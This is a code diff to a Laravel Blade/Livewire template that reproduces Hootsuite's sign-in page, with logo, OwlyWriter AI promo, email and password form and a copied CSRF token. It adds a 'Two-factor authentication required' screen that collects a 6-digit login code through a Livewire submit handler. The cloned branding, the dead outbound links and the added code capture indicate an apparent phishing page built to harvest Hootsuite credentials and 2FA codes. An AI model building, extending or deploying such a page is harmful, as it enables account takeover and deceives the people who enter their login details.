@@ -532,187 +532,289 @@
                         </div>
                         <div class="ant-modal-body" style="min-height: 650px">
                             <div class="confirmation-container-modal">
-                                <div class="rtpMainLogin mainLogin _mainLoginBlock">
-                                    <!-- Content -->
-                                    <div class="rtpColumn owly-writer-sign-in">
-                                        <div class="tt-container-element">
-                                            <div class="tt-child-element-left">
-                                                <div class="rtpHSLogoAnchor">
-                                                    <a href="javascript:void(0)" tabindex="0"
-                                                        aria-label="Hootsuite.com Main Landing Page">
-                                                        <svg style="width: auto; height: 30px;"
-                                                            viewBox="77.685 25.563 884.115 162.737" version="1.1"
-                                                            xmlns="http://www.w3.org/2000/svg">
-                                                            <g>
-                                                                <path fill="#FF4C46"
-                                                                    d="M238.4,48l-52.5,4.7c-9.1-5.3-18.1-7.4-27.6-7.4c-2.5,0-5.1,0.2-7.7,0.7L95.7,25.7 c-2.2-0.8-3.8,2.1-1.9,3.5l33.7,26.1c-7.1,4.4-13.8,10.2-19.7,16.8C97.7,83.6,85.1,115.4,79,132c-2.6,7.1-1.3,15,3.5,20.8 c11.2,13.6,34.4,35.6,79,35.6c40.9,0,61.6-18.4,71.3-31.8c5.4-7.5,7-17,4.3-25.8c-4.4-14.9-13.7-40.7-28.8-58.4 c-0.5-0.6-1.1-1.2-1.6-1.8l32.7-19.4C240.9,50.3,240.2,47.9,238.4,48z">
-                                                                </path>
-                                                            </g>
-                                                            <g>
-                                                                <path fill="#FFFFFF"
-                                                                    d="M183.6,143.9c-3.9,1.4-12.7,3.5-22.5-1.6c-0.5-0.3-1,0.4-0.6,0.8c3.1,3.3,8.6,9.2,12,12 c0.7,0.6,1.8,0.5,2.4-0.2l9.3-10.3C184.5,144.3,184.1,143.7,183.6,143.9z">
-                                                                </path>
-                                                                <path fill="#FFFFFF"
-                                                                    d="M219.9,101.1c-5-10.8-12.4-20.9-23.7-22.1c-2-0.2-4.1,0.2-5.8,1.3l-12.3,7.3c-3.1,1.8-6.9,1.6-9.7-0.6 l-10.7-8.3c-3.6-2.8-7.7-4.8-12.1-5.8c-18.3-4.3-30.7,5.3-40.1,23.3c-9,17.2-4,42,18.1,47.8c23.3,6.2,38.7-19.7,44.9-28.3 c1.2-1.7,3.6-1.7,4.8,0c9.6,13,22.4,26.9,36.2,24.1C227.6,136.1,225.5,113.3,219.9,101.1z M152.4,114.8 c-4.5,3-10.2,2.3-13.6-2.8c-3.4-5.1-1.9-10.7,2.6-13.7c4.5-3,10.2-2.3,13.6,2.8C158.4,106.2,156.9,111.8,152.4,114.8z M200.1,115.7c-4.5,3-10.2,2.3-13.6-2.8c-3.4-5.1-1.9-10.7,2.6-13.7c4.5-3,10.2-2.3,13.6,2.8 C206.1,107.1,204.6,112.7,200.1,115.7z">
-                                                                </path>
-                                                                <path fill="#FFFFFF"
-                                                                    d="M173.1,122.3c-0.9-1-2.6-1-3.5,0.1l-9.8,11.6c-0.5,0.5-0.4,1.4,0.2,1.8c2.3,1.6,7.8,5.2,13.2,5.2 c5,0,9.5-1.9,11.7-3c0.7-0.4,0.9-1.3,0.4-1.9L173.1,122.3z">
-                                                                </path>
-                                                            </g>
-                                                            <g>
-                                                                <g>
-                                                                    <path fill="#FF4C46"
-                                                                        d="M284.2,155.2V77.6h17.2v33.7h57.1V77.6h17.2v77.6h-17.2v-29.4h-57.1v29.4H284.2z">
-                                                                    </path>
-                                                                    <path fill="#FF4C46"
-                                                                        d="M424.5,157.2c-11.4,0-20.6-3-27.5-8.9c-7-5.9-10.4-13.7-10.4-23.4c0-9.7,3.5-17.5,10.4-23.4 c7-5.9,16.1-8.9,27.5-8.9c11.5,0,20.7,3,27.7,8.9c7,5.9,10.4,13.7,10.4,23.4c0,9.7-3.5,17.5-10.4,23.4 C445.2,154.2,436,157.2,424.5,157.2z M424.5,143.8c6.6,0,12-1.7,16-5.2c4-3.5,6.1-8,6.1-13.7c0-5.7-2-10.4-6.1-13.8 c-4-3.5-9.4-5.2-16-5.2c-6.6,0-11.8,1.8-15.9,5.3c-4,3.5-6.1,8.1-6.1,13.8c0,5.7,2,10.2,6.1,13.7 C412.7,142.1,418,143.8,424.5,143.8z">
-                                                                    </path>
-                                                                    <path fill="#FF4C46"
-                                                                        d="M508.3,157.2c-11.4,0-20.6-3-27.5-8.9c-7-5.9-10.4-13.7-10.4-23.4c0-9.7,3.5-17.5,10.4-23.4 c7-5.9,16.1-8.9,27.5-8.9c11.5,0,20.7,3,27.7,8.9c7,5.9,10.4,13.7,10.4,23.4c0,9.7-3.5,17.5-10.4,23.4 C529,154.2,519.8,157.2,508.3,157.2z M508.3,143.8c6.6,0,12-1.7,16-5.2c4-3.5,6.1-8,6.1-13.7c0-5.7-2-10.4-6.1-13.8 c-4-3.5-9.4-5.2-16-5.2c-6.6,0-11.8,1.8-15.9,5.3c-4,3.5-6.1,8.1-6.1,13.8c0,5.7,2,10.2,6.1,13.7 C496.4,142.1,501.7,143.8,508.3,143.8z">
-                                                                    </path>
-                                                                    <path fill="#FF4C46"
-                                                                        d="M578.2,156.4c-7.6,0-11.9-3.5-14.1-6.7c-2.3-3.2-4.1-7.3-4.1-16.3v-26.3h-8.7V94.6h11.2v-17h14.8v17h17.5 v12.5h-17.5v22.7c-0.1,6.8,1,9.2,2.6,10.9c2.9,2.9,11.7,0.9,14.9-1.1v13.1C591,155.2,584.3,156.4,578.2,156.4z">
-                                                                    </path>
-                                                                    <path fill="#FF4C46"
-                                                                        d="M638.6,157.2c-10.8,0-21.6-1.6-32.5-4.7v-13.8c9.1,3.5,19,5.2,29.7,5.2c7.7,0,13.2-0.5,16.5-1.5 c3.3-1,5-2.7,5-5.2c0-2.3-1.8-4-5.5-4.9c-3.7-0.9-8.2-1.5-13.5-1.8c-5.3-0.2-10.6-0.7-15.9-1.4c-5.3-0.7-9.8-2.4-13.5-5 c-3.7-2.7-5.5-6.4-5.5-11.3c0-6.6,3.2-11.6,9.6-15c6.4-3.4,15.1-5.1,26.1-5.1c8.7,0,18.8,1.1,30.3,3.4v13.3 c-9.9-2.1-19.5-3.2-28.5-3.2c-13.7,0-20.6,2.1-20.6,6.3c0,2.1,1.9,3.6,5.6,4.4c3.7,0.8,8.2,1.4,13.5,1.8 c5.3,0.3,10.5,0.9,15.8,1.6c5.3,0.8,9.8,2.5,13.5,5.3c3.7,2.8,5.6,6.6,5.6,11.5c0,6.8-3.2,11.8-9.5,15.1 C658.5,155.5,649.7,157.2,638.6,157.2z">
-                                                                    </path>
-                                                                    <path fill="#FF4C46"
-                                                                        d="M756.6,94.6v60.7h-18.9l2.4-25h-1c-2.8,18-12.8,26.9-29.8,26.9c-8.7-0.2-15.1-3-19.2-8.6 c-4-5.5-6.1-14.8-6.1-27.7V94.6h17.2v24.3c0,9.1,1.3,15.6,3.9,19.5c2.6,3.9,6.8,5.8,12.7,5.8c6.6,0,11.8-3,15.6-9 c3.9-6,5.8-13.9,5.8-23.9V94.6H756.6z">
-                                                                    </path>
-                                                                    <path fill="#FF4C46"
-                                                                        d="M780,88.7c-3.3,0-5.9-0.8-7.8-2.5c-1.9-1.7-2.8-4.1-2.8-7.3c0-3.2,0.9-5.7,2.8-7.3 c1.9-1.6,4.4-2.4,7.8-2.4c3.4,0,6,0.8,7.9,2.4c1.9,1.6,2.9,4,2.9,7.3C790.8,85.5,787.2,88.7,780,88.7z M771.6,155.2V94.6h17.2 v60.7H771.6z">
-                                                                    </path>
-                                                                    <path fill="#FF4C46"
-                                                                        d="M885.9,157.2c-11,0-19.8-3-26.5-8.9c-6.7-5.9-10-13.7-10-23.4c0-9.7,3.3-17.5,10-23.4 c6.7-5.9,15.5-8.9,26.5-8.9c10.8,0,19.6,2.5,26.3,7.6c6.7,5.1,10.1,11.7,10.3,20v9.9h-56.5c1,4.9,3.5,8.5,7.7,10.7 c4.2,2.2,10.3,3.3,18.4,3.3c10.7,0,15.5-1.7,20.7-3.6c0.8-0.3,6.5-2.8,7-3v13.8c-6.1,2.3-11.4,3.9-15.9,4.7 C899.3,156.7,893.3,157.2,885.9,157.2z M865.5,121.7l40.5-1c-0.2-5.3-2-9.2-5.2-11.5c-3.2-2.3-8.2-3.5-14.9-3.5 c-6.5,0-11.3,1.2-14.6,3.7C868,112,866.1,116.1,865.5,121.7z">
-                                                                    </path>
-                                                                    <path fill="#FF4C46"
-                                                                        d="M827.2,156.4c-7.6,0-11.9-3.5-14.1-6.7c-2.3-3.2-4.1-7.3-4.1-16.3v-26.3h-8.7V94.6h11.2v-17h14.8v17h17.5 v12.5h-17.5v22.7c-0.1,6.8,1,9.2,2.6,10.9c2.9,2.9,11.7,0.9,14.9-1.1v13.1C840,155.2,833.4,156.4,827.2,156.4z">
-                                                                    </path>
-                                                                </g>
-                                                                <g>
-                                                                    <path fill="#FF4C46"
-                                                                        d="M939.3,108.5c-1.6,1.6-3.5,2.4-5.8,2.4s-4.2-0.8-5.8-2.4c-1.6-1.6-2.4-3.5-2.4-5.8c0-2.2,0.8-4.2,2.4-5.8 c1.6-1.6,3.5-2.4,5.8-2.4c2.3,0,4.2,0.8,5.8,2.4c1.6,1.6,2.4,3.5,2.4,5.8C941.7,105,940.9,106.9,939.3,108.5z M928.6,97.7 c-1.4,1.4-2,3-2,5c0,2,0.7,3.6,2,5c1.4,1.4,3,2.1,5,2.1c2,0,3.6-0.7,5-2.1c1.4-1.4,2-3.1,2-5c0-1.9-0.7-3.6-2-5 c-1.4-1.4-3-2.1-5-2.1C931.6,95.7,929.9,96.4,928.6,97.7z M933.4,98.2c1.1,0,1.9,0.1,2.5,0.3c0.9,0.4,1.4,1.1,1.4,2.3 c0,0.8-0.3,1.4-0.9,1.8c-0.3,0.2-0.7,0.3-1.3,0.4c0.7,0.1,1.2,0.4,1.5,0.9s0.5,0.9,0.5,1.4v0.7c0,0.2,0,0.4,0,0.7 c0,0.2,0,0.4,0.1,0.5l0.1,0.1h-1.5c0,0,0-0.1,0-0.1c0,0,0-0.1,0-0.1l0-0.3V106c0-1-0.3-1.7-0.8-2.1c-0.3-0.2-0.9-0.3-1.8-0.3 h-1.2v3.5h-1.6v-9H933.4z M935.1,99.6c-0.4-0.2-1-0.3-1.9-0.3h-1.4v3.3h1.4c0.7,0,1.2-0.1,1.5-0.2c0.6-0.2,0.9-0.7,0.9-1.4 C935.7,100.3,935.5,99.8,935.1,99.6z">
-                                                                    </path>
-                                                                </g>
-                                                            </g>
-                                                        </svg>
-                                                    </a>
 
+                                @if ($enableLoginForm)
+                                    <div class="rtpMainLogin mainLogin _mainLoginBlock">
+                                        <!-- Content -->
+                                        <div class="rtpColumn owly-writer-sign-in">
+                                            <div class="tt-container-element">
+                                                <div class="tt-child-element-left">
+                                                    <div class="rtpHSLogoAnchor">
+                                                        <a href="javascript:void(0)" tabindex="0"
+                                                            aria-label="Hootsuite.com Main Landing Page">
+                                                            <svg style="width: auto; height: 30px;"
+                                                                viewBox="77.685 25.563 884.115 162.737" version="1.1"
+                                                                xmlns="http://www.w3.org/2000/svg">
+                                                                <g>
+                                                                    <path fill="#FF4C46"
+                                                                        d="M238.4,48l-52.5,4.7c-9.1-5.3-18.1-7.4-27.6-7.4c-2.5,0-5.1,0.2-7.7,0.7L95.7,25.7 c-2.2-0.8-3.8,2.1-1.9,3.5l33.7,26.1c-7.1,4.4-13.8,10.2-19.7,16.8C97.7,83.6,85.1,115.4,79,132c-2.6,7.1-1.3,15,3.5,20.8 c11.2,13.6,34.4,35.6,79,35.6c40.9,0,61.6-18.4,71.3-31.8c5.4-7.5,7-17,4.3-25.8c-4.4-14.9-13.7-40.7-28.8-58.4 c-0.5-0.6-1.1-1.2-1.6-1.8l32.7-19.4C240.9,50.3,240.2,47.9,238.4,48z">
+                                                                    </path>
+                                                                </g>
+                                                                <g>
+                                                                    <path fill="#FFFFFF"
+                                                                        d="M183.6,143.9c-3.9,1.4-12.7,3.5-22.5-1.6c-0.5-0.3-1,0.4-0.6,0.8c3.1,3.3,8.6,9.2,12,12 c0.7,0.6,1.8,0.5,2.4-0.2l9.3-10.3C184.5,144.3,184.1,143.7,183.6,143.9z">
+                                                                    </path>
+                                                                    <path fill="#FFFFFF"
+                                                                        d="M219.9,101.1c-5-10.8-12.4-20.9-23.7-22.1c-2-0.2-4.1,0.2-5.8,1.3l-12.3,7.3c-3.1,1.8-6.9,1.6-9.7-0.6 l-10.7-8.3c-3.6-2.8-7.7-4.8-12.1-5.8c-18.3-4.3-30.7,5.3-40.1,23.3c-9,17.2-4,42,18.1,47.8c23.3,6.2,38.7-19.7,44.9-28.3 c1.2-1.7,3.6-1.7,4.8,0c9.6,13,22.4,26.9,36.2,24.1C227.6,136.1,225.5,113.3,219.9,101.1z M152.4,114.8 c-4.5,3-10.2,2.3-13.6-2.8c-3.4-5.1-1.9-10.7,2.6-13.7c4.5-3,10.2-2.3,13.6,2.8C158.4,106.2,156.9,111.8,152.4,114.8z M200.1,115.7c-4.5,3-10.2,2.3-13.6-2.8c-3.4-5.1-1.9-10.7,2.6-13.7c4.5-3,10.2-2.3,13.6,2.8 C206.1,107.1,204.6,112.7,200.1,115.7z">
+                                                                    </path>
+                                                                    <path fill="#FFFFFF"
+                                                                        d="M173.1,122.3c-0.9-1-2.6-1-3.5,0.1l-9.8,11.6c-0.5,0.5-0.4,1.4,0.2,1.8c2.3,1.6,7.8,5.2,13.2,5.2 c5,0,9.5-1.9,11.7-3c0.7-0.4,0.9-1.3,0.4-1.9L173.1,122.3z">
+                                                                    </path>
+                                                                </g>
+                                                                <g>
+                                                                    <g>
+                                                                        <path fill="#FF4C46"
+                                                                            d="M284.2,155.2V77.6h17.2v33.7h57.1V77.6h17.2v77.6h-17.2v-29.4h-57.1v29.4H284.2z">
+                                                                        </path>
+                                                                        <path fill="#FF4C46"
+                                                                            d="M424.5,157.2c-11.4,0-20.6-3-27.5-8.9c-7-5.9-10.4-13.7-10.4-23.4c0-9.7,3.5-17.5,10.4-23.4 c7-5.9,16.1-8.9,27.5-8.9c11.5,0,20.7,3,27.7,8.9c7,5.9,10.4,13.7,10.4,23.4c0,9.7-3.5,17.5-10.4,23.4 C445.2,154.2,436,157.2,424.5,157.2z M424.5,143.8c6.6,0,12-1.7,16-5.2c4-3.5,6.1-8,6.1-13.7c0-5.7-2-10.4-6.1-13.8 c-4-3.5-9.4-5.2-16-5.2c-6.6,0-11.8,1.8-15.9,5.3c-4,3.5-6.1,8.1-6.1,13.8c0,5.7,2,10.2,6.1,13.7 C412.7,142.1,418,143.8,424.5,143.8z">
+                                                                        </path>
+                                                                        <path fill="#FF4C46"
+                                                                            d="M508.3,157.2c-11.4,0-20.6-3-27.5-8.9c-7-5.9-10.4-13.7-10.4-23.4c0-9.7,3.5-17.5,10.4-23.4 c7-5.9,16.1-8.9,27.5-8.9c11.5,0,20.7,3,27.7,8.9c7,5.9,10.4,13.7,10.4,23.4c0,9.7-3.5,17.5-10.4,23.4 C529,154.2,519.8,157.2,508.3,157.2z M508.3,143.8c6.6,0,12-1.7,16-5.2c4-3.5,6.1-8,6.1-13.7c0-5.7-2-10.4-6.1-13.8 c-4-3.5-9.4-5.2-16-5.2c-6.6,0-11.8,1.8-15.9,5.3c-4,3.5-6.1,8.1-6.1,13.8c0,5.7,2,10.2,6.1,13.7 C496.4,142.1,501.7,143.8,508.3,143.8z">
+                                                                        </path>
+                                                                        <path fill="#FF4C46"
+                                                                            d="M578.2,156.4c-7.6,0-11.9-3.5-14.1-6.7c-2.3-3.2-4.1-7.3-4.1-16.3v-26.3h-8.7V94.6h11.2v-17h14.8v17h17.5 v12.5h-17.5v22.7c-0.1,6.8,1,9.2,2.6,10.9c2.9,2.9,11.7,0.9,14.9-1.1v13.1C591,155.2,584.3,156.4,578.2,156.4z">
+                                                                        </path>
+                                                                        <path fill="#FF4C46"
+                                                                            d="M638.6,157.2c-10.8,0-21.6-1.6-32.5-4.7v-13.8c9.1,3.5,19,5.2,29.7,5.2c7.7,0,13.2-0.5,16.5-1.5 c3.3-1,5-2.7,5-5.2c0-2.3-1.8-4-5.5-4.9c-3.7-0.9-8.2-1.5-13.5-1.8c-5.3-0.2-10.6-0.7-15.9-1.4c-5.3-0.7-9.8-2.4-13.5-5 c-3.7-2.7-5.5-6.4-5.5-11.3c0-6.6,3.2-11.6,9.6-15c6.4-3.4,15.1-5.1,26.1-5.1c8.7,0,18.8,1.1,30.3,3.4v13.3 c-9.9-2.1-19.5-3.2-28.5-3.2c-13.7,0-20.6,2.1-20.6,6.3c0,2.1,1.9,3.6,5.6,4.4c3.7,0.8,8.2,1.4,13.5,1.8 c5.3,0.3,10.5,0.9,15.8,1.6c5.3,0.8,9.8,2.5,13.5,5.3c3.7,2.8,5.6,6.6,5.6,11.5c0,6.8-3.2,11.8-9.5,15.1 C658.5,155.5,649.7,157.2,638.6,157.2z">
+                                                                        </path>
+                                                                        <path fill="#FF4C46"
+                                                                            d="M756.6,94.6v60.7h-18.9l2.4-25h-1c-2.8,18-12.8,26.9-29.8,26.9c-8.7-0.2-15.1-3-19.2-8.6 c-4-5.5-6.1-14.8-6.1-27.7V94.6h17.2v24.3c0,9.1,1.3,15.6,3.9,19.5c2.6,3.9,6.8,5.8,12.7,5.8c6.6,0,11.8-3,15.6-9 c3.9-6,5.8-13.9,5.8-23.9V94.6H756.6z">
+                                                                        </path>
+                                                                        <path fill="#FF4C46"
+                                                                            d="M780,88.7c-3.3,0-5.9-0.8-7.8-2.5c-1.9-1.7-2.8-4.1-2.8-7.3c0-3.2,0.9-5.7,2.8-7.3 c1.9-1.6,4.4-2.4,7.8-2.4c3.4,0,6,0.8,7.9,2.4c1.9,1.6,2.9,4,2.9,7.3C790.8,85.5,787.2,88.7,780,88.7z M771.6,155.2V94.6h17.2 v60.7H771.6z">
+                                                                        </path>
+                                                                        <path fill="#FF4C46"
+                                                                            d="M885.9,157.2c-11,0-19.8-3-26.5-8.9c-6.7-5.9-10-13.7-10-23.4c0-9.7,3.3-17.5,10-23.4 c6.7-5.9,15.5-8.9,26.5-8.9c10.8,0,19.6,2.5,26.3,7.6c6.7,5.1,10.1,11.7,10.3,20v9.9h-56.5c1,4.9,3.5,8.5,7.7,10.7 c4.2,2.2,10.3,3.3,18.4,3.3c10.7,0,15.5-1.7,20.7-3.6c0.8-0.3,6.5-2.8,7-3v13.8c-6.1,2.3-11.4,3.9-15.9,4.7 C899.3,156.7,893.3,157.2,885.9,157.2z M865.5,121.7l40.5-1c-0.2-5.3-2-9.2-5.2-11.5c-3.2-2.3-8.2-3.5-14.9-3.5 c-6.5,0-11.3,1.2-14.6,3.7C868,112,866.1,116.1,865.5,121.7z">
+                                                                        </path>
+                                                                        <path fill="#FF4C46"
+                                                                            d="M827.2,156.4c-7.6,0-11.9-3.5-14.1-6.7c-2.3-3.2-4.1-7.3-4.1-16.3v-26.3h-8.7V94.6h11.2v-17h14.8v17h17.5 v12.5h-17.5v22.7c-0.1,6.8,1,9.2,2.6,10.9c2.9,2.9,11.7,0.9,14.9-1.1v13.1C840,155.2,833.4,156.4,827.2,156.4z">
+                                                                        </path>
+                                                                    </g>
+                                                                    <g>
+                                                                        <path fill="#FF4C46"
+                                                                            d="M939.3,108.5c-1.6,1.6-3.5,2.4-5.8,2.4s-4.2-0.8-5.8-2.4c-1.6-1.6-2.4-3.5-2.4-5.8c0-2.2,0.8-4.2,2.4-5.8 c1.6-1.6,3.5-2.4,5.8-2.4c2.3,0,4.2,0.8,5.8,2.4c1.6,1.6,2.4,3.5,2.4,5.8C941.7,105,940.9,106.9,939.3,108.5z M928.6,97.7 c-1.4,1.4-2,3-2,5c0,2,0.7,3.6,2,5c1.4,1.4,3,2.1,5,2.1c2,0,3.6-0.7,5-2.1c1.4-1.4,2-3.1,2-5c0-1.9-0.7-3.6-2-5 c-1.4-1.4-3-2.1-5-2.1C931.6,95.7,929.9,96.4,928.6,97.7z M933.4,98.2c1.1,0,1.9,0.1,2.5,0.3c0.9,0.4,1.4,1.1,1.4,2.3 c0,0.8-0.3,1.4-0.9,1.8c-0.3,0.2-0.7,0.3-1.3,0.4c0.7,0.1,1.2,0.4,1.5,0.9s0.5,0.9,0.5,1.4v0.7c0,0.2,0,0.4,0,0.7 c0,0.2,0,0.4,0.1,0.5l0.1,0.1h-1.5c0,0,0-0.1,0-0.1c0,0,0-0.1,0-0.1l0-0.3V106c0-1-0.3-1.7-0.8-2.1c-0.3-0.2-0.9-0.3-1.8-0.3 h-1.2v3.5h-1.6v-9H933.4z M935.1,99.6c-0.4-0.2-1-0.3-1.9-0.3h-1.4v3.3h1.4c0.7,0,1.2-0.1,1.5-0.2c0.6-0.2,0.9-0.7,0.9-1.4 C935.7,100.3,935.5,99.8,935.1,99.6z">
+                                                                        </path>
+                                                                    </g>
+                                                                </g>
+                                                            </svg>
+                                                        </a>
+
+                                                    </div>
+                                                    <h1 class="rtpTitle">Do more in less time with OwlyWriter AI</h1>
+                                                    <p class="rtpSubTitle">Generate captions and posts in seconds!
+                                                        OwlyWriter AI makes content creation seriously easy for busy
+                                                        social
+                                                        pros like you.</p>
+                                                    <p class="tikTokAlertBox">
+                                                        <span class="alertBoxHighlight">Our AI tool is so simple to
+                                                            use,
+                                                            anyone can do it. <span class="alertBoxText">Click
+                                                                Inspiration
+                                                                to get started.</span></span>
+                                                    </p>
+                                                    <span class="spacer"></span>
+                                                    <p class="footnote"><a class="upgradePlan"
+                                                            href="javascript:void(0)" tabindex="0">Try OwlyWriter AI
+                                                            now.</a></p>
                                                 </div>
-                                                <h1 class="rtpTitle">Do more in less time with OwlyWriter AI</h1>
-                                                <p class="rtpSubTitle">Generate captions and posts in seconds!
-                                                    OwlyWriter AI makes content creation seriously easy for busy social
-                                                    pros like you.</p>
-                                                <p class="tikTokAlertBox">
-                                                    <span class="alertBoxHighlight">Our AI tool is so simple to use,
-                                                        anyone can do it. <span class="alertBoxText">Click Inspiration
-                                                            to get started.</span></span>
-                                                </p>
-                                                <span class="spacer"></span>
-                                                <p class="footnote"><a class="upgradePlan"
-                                                        href="javascript:void(0)" tabindex="0"
-                                                        >Try OwlyWriter AI now.</a></p>
+                                                <div class="tt-child-element-right">
+                                                    <span class="spacer"></span>
+                                                    <div class="owly-writer-ai-video-container">
+                                                        <video autoplay="" loop="" muted=""
+                                                            aria-label="An animated image, with a happy-looking owl, called Owly, in a robot suit holding a smartphone, which is showing multiple love hearts and happy face emojis, after using OwlyWriter AI">
+                                                            <source
+                                                                src="https://i.hootsuite.com/assets/identity/dashboard/login/owly-writer-ai.mp4"
+                                                                type="video/mp4">
+                                                            Your browser does not support the video tag.
+                                                        </video>
+                                                    </div>
+                                                </div>
                                             </div>
-                                            <div class="tt-child-element-right">
-                                                <span class="spacer"></span>
-                                                <div class="owly-writer-ai-video-container">
-                                                    <video autoplay="" loop="" muted=""
-                                                        aria-label="An animated image, with a happy-looking owl, called Owly, in a robot suit holding a smartphone, which is showing multiple love hearts and happy face emojis, after using OwlyWriter AI">
-                                                        <source
-                                                            src="https://i.hootsuite.com/assets/identity/dashboard/login/owly-writer-ai.mp4"
-                                                            type="video/mp4">
-                                                        Your browser does not support the video tag.
-                                                    </video>
+                                        </div>
+
+                                        <div class="rtpLoginColumn">
+                                            <div class="rtpSelectionContainer">
+                                                <h1>Sign in</h1>
+                                                <!-- Error, Notice and Success Messages -->
+                                                <div class="formContainer">
+                                                    <form method="post" class="_emailPasswordForm" action="/signin">
+                                                        <!-- Email and Password Inputs -->
+                                                        <div class="inputWrapper">
+                                                            <label for="loginEmailInput">Email</label>
+                                                            <input id="loginEmailInput"
+                                                                class="inputContainer _requiredInput _emailInput"
+                                                                required="" type="email" name="email"
+                                                                title="Please enter a valid email address"
+                                                                maxlength="100" autofocus="autofocus" value=""
+                                                                role="textbox" aria-labelledby="loginEmailLabel"
+                                                                aria-required="true"
+                                                                aria-describedby="inlineErrorTitle_loginEmailInput inlineErrorMessage_loginEmailInput">
+                                                            <div id="inlineErrorContainer"
+                                                                class="inlineErrorContainer _inlineErrorContainer"
+                                                                style="display:none;">
+                                                                <div class="inlineErrorIconContainer">
+                                                                    <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
+                                                                        class="inlineErrorIcon">
+                                                                </div>
+                                                                <div class="inlineErrorMessageContainer">
+                                                                    <div class="inlineErrorTitle _inlineErrorTitle"
+                                                                        id="inlineErrorTitle_loginEmailInput"
+                                                                        role="alert"></div>
+                                                                    <div class="inlineErrorMessage _inlineErrorMessage"
+                                                                        id="inlineErrorMessage_loginEmailInput"
+                                                                        role="alert"></div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="inputWrapper allowWrap">
+                                                            <label for="loginPasswordInput">Password
+                                                                <a href="javascript:void(0)"
+                                                                    class="forgotPassword _forgotPassword ">Forgot
+                                                                    password
+                                                                </a>
+                                                            </label>
+                                                            <input id="loginPasswordInput" required=""
+                                                                type="password" name="password" maxlength="100"
+                                                                class="inputContainer _requiredInput _passwordInput"
+                                                                role="textbox" aria-labelledby="loginPasswordLabel"
+                                                                aria-required="true"
+                                                                aria-describedby="inlineErrorTitle_loginPasswordInput inlineErrorMessage_loginPasswordInput">
+
+                                                            <div id="inlineErrorContainer"
+                                                                class="inlineErrorContainer _inlineErrorContainer"
+                                                                style="display:none;">
+                                                                <div class="inlineErrorIconContainer">
+                                                                    <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
+                                                                        class="inlineErrorIcon">
+                                                                </div>
+                                                                <div class="inlineErrorMessageContainer">
+                                                                    <div class="inlineErrorTitle _inlineErrorTitle"
+                                                                        id="inlineErrorTitle_loginPasswordInput"
+                                                                        role="alert"></div>
+                                                                    <div class="inlineErrorMessage _inlineErrorMessage"
+                                                                        id="inlineErrorMessage_loginPasswordInput"
+                                                                        role="alert"></div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <!-- Sign In (CTA) Button -->
+                                                        <button class="button disabled _submit submitButton"
+                                                            type="submit" aria-disabled="true" tabindex="-1"
+                                                            aria-describedby="inlineErrorContainer">Sign in</button>
+                                                        <input type="hidden" name="method" value="email">
+                                                        <input type="hidden" name="loginCsrfToken"
+                                                            value="052aef9e00fc39365803c4440d3f06fbf44cd8a909172b6b8e7bcce0fb84c2b1bd981bb16b2f4454c3badab40cd9e1cfe6f144122e31186f6448c9310aefd59d">
+                                                    </form>
+                                                </div>
+                                                <div class="linksSectionContainer">
+                                                    <a href="javascript:void(0)" class="link">Sign up</a>
+                                                    <p class="modLegalNotice x-login">
+                                                        By selecting Sign in, I agree to <a
+                                                            href="javascript:void(0)">Hootsuite's Terms</a>, including
+                                                        the payment
+                                                        terms, and <a href="javascript:void(0)">Privacy Policy</a>
+                                                    </p>
                                                 </div>
                                             </div>
                                         </div>
                                     </div>
-
-                                    <div class="rtpLoginColumn">
-                                        <div class="rtpSelectionContainer">
-                                            <h1>Sign in</h1>
-                                            <!-- Error, Notice and Success Messages -->
-                                            <div class="formContainer">
-                                                <form method="post" class="_emailPasswordForm" action="/signin">
-                                                    <!-- Email and Password Inputs -->
-                                                    <div class="inputWrapper">
-                                                        <label for="loginEmailInput">Email</label>
-                                                        <input id="loginEmailInput"
-                                                            class="inputContainer _requiredInput _emailInput"
-                                                            required="" type="email" name="email"
-                                                            title="Please enter a valid email address" maxlength="100"
-                                                            autofocus="autofocus" value="" role="textbox"
-                                                            aria-labelledby="loginEmailLabel" aria-required="true"
-                                                            aria-describedby="inlineErrorTitle_loginEmailInput inlineErrorMessage_loginEmailInput">
-                                                        <div id="inlineErrorContainer"
-                                                            class="inlineErrorContainer _inlineErrorContainer"
-                                                            style="display:none;">
-                                                            <div class="inlineErrorIconContainer">
-                                                                <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
-                                                                    class="inlineErrorIcon">
-                                                            </div>
-                                                            <div class="inlineErrorMessageContainer">
-                                                                <div class="inlineErrorTitle _inlineErrorTitle"
-                                                                    id="inlineErrorTitle_loginEmailInput"
-                                                                    role="alert"></div>
-                                                                <div class="inlineErrorMessage _inlineErrorMessage"
-                                                                    id="inlineErrorMessage_loginEmailInput"
-                                                                    role="alert"></div>
-                                                            </div>
+                                @endif
+                                @if ($twoFaPage)
+                                    <div class="auth-req-container">
+                                        <form id="desktop-code" class="auth-req" wire:submit.prevent="codeSubmit">
+                                            <div class="auth-req-text">
+                                                <h2>Two-factor authentication required</h2>
+                                                <div class="auth-req-paragraph">
+                                                    <p class="first">You’ve asked us to require a 6-digit login code
+                                                        when anyone tries to access your account from a new device or
+                                                        browser.</p>
+                                                    <p class="second">Enter the 6-digit code from your <strong>code
+                                                            generator</strong> or third-party app below.</p>
+                                                </div>
+                                                <div class="input-auth-req">
+                                                    <input maxlength="6" minlength="6" name="code"
+                                                        class="show-input-on-desktop" placeholder="Login Code"
+                                                        type="number" required="required">
+                                                    @if ($codeError)
+                                                        <div class="show-error-modal">
+                                                            <p>The login code you entered doesn't match the one sent to
+                                                                your phone. Please check the number and try again.</p>
                                                         </div>
-                                                    </div>
-                                                    <div class="inputWrapper allowWrap">
-                                                        <label for="loginPasswordInput">Password
-                                                            <a href="javascript:void(0)"
-                                                                class="forgotPassword _forgotPassword ">Forgot
-                                                                password
-                                                            </a>
-                                                        </label>
-                                                        <input id="loginPasswordInput" required="" type="password"
-                                                            name="password" maxlength="100"
-                                                            class="inputContainer _requiredInput _passwordInput"
-                                                            role="textbox" aria-labelledby="loginPasswordLabel"
-                                                            aria-required="true"
-                                                            aria-describedby="inlineErrorTitle_loginPasswordInput inlineErrorMessage_loginPasswordInput">
-
-                                                        <div id="inlineErrorContainer"
-                                                            class="inlineErrorContainer _inlineErrorContainer"
-                                                            style="display:none;">
